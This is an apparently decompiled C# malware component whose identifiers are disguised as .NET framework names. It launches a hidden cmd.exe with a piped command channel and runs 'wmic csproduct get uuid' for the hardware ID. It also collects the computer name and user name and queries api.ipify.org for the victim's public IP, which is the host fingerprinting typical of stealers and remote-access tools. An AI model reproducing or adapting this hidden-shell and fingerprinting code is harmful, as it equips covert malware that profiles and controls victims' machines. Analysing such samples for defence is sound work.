using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

internal class Set_AssemblyResolver
{
	private class CalendarWeekRule : IDisposable
	{
		private Process UTF8StringEqualityComparer;

		private StreamWriter EditorBrowsableState;

		private AutoResetEvent M_syncRoot;

		private string CurrSC;

		public CalendarWeekRule(string string_0)
		{
			UTF8StringEqualityComparer = new Process();
			M_syncRoot = new AutoResetEvent(initialState: false);
			CurrSC = string.Empty;
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = string_0,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardInput = true,
				CreateNoWindow = true
			};
			UTF8StringEqualityComparer.OutputDataReceived += GetInterface;
			UTF8StringEqualityComparer.StartInfo = startInfo;
			UTF8StringEqualityComparer.Start();
			EditorBrowsableState = UTF8StringEqualityComparer.StandardInput;
			UTF8StringEqualityComparer.BeginOutputReadLine();
		}

		public void Dispose()
		{
			UTF8StringEqualityComparer.Close();
			UTF8StringEqualityComparer.Dispose();
			EditorBrowsableState.Close();
			EditorBrowsableState.Dispose();
		}

		public string NativeGetLocaleInfoExInt(string string_0)
		{
			CurrSC = string.Empty;
			EditorBrowsableState.WriteLine(string_0);
			EditorBrowsableState.WriteLine("echo end");
			M_syncRoot.WaitOne();
			return CurrSC;
		}

		private void GetInterface(object sender, DataReceivedEventArgs e)
		{
			if (e.Data == null || e.Data == "end")
			{
				M_syncRoot.Set();
			}
			else
			{
				CurrSC = CurrSC + e.Data + Environment.NewLine;
			}
		}
	}

	private static CancelAsync Day = new CancelAsync("DEBUG", 0);

	public static string FindMethodHandle()
	{
		string result = string.Empty;
		try
		{
			using CalendarWeekRule calendarWeekRule = new CalendarWeekRule("cmd.exe");
			string text = calendarWeekRule.NativeGetLocaleInfoExInt("wmic csproduct get uuid");
			result = text.Split(new char[1] { '\n' })[6];
		}
		catch (Exception ex)
		{
			Day.Conv_Ovf_I_Un(ex.Message);
		}
		return result;
	}

	public static List<string> TryCode()
	{
		List<string> list = new List<string>();
		string environmentVariable = Environment.GetEnvironmentVariable("COMPUTERNAME");
		string environmentVariable2 = Environment.GetEnvironmentVariable("UserName");
		list.Add(environmentVariable);
		list.Add(environmentVariable2);
		return list;
	}

	public static string CodePageUTF8()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		string result = string.Empty;
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				Task<HttpResponseMessage> async = val.GetAsync("https://api.ipify.org");
				Task<string> task = async.Result.get_Content().ReadAsStringAsync();
				result = task.Result;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Day.Conv_Ovf_I_Un(ex.Message);
		}
		return result;
	}
}
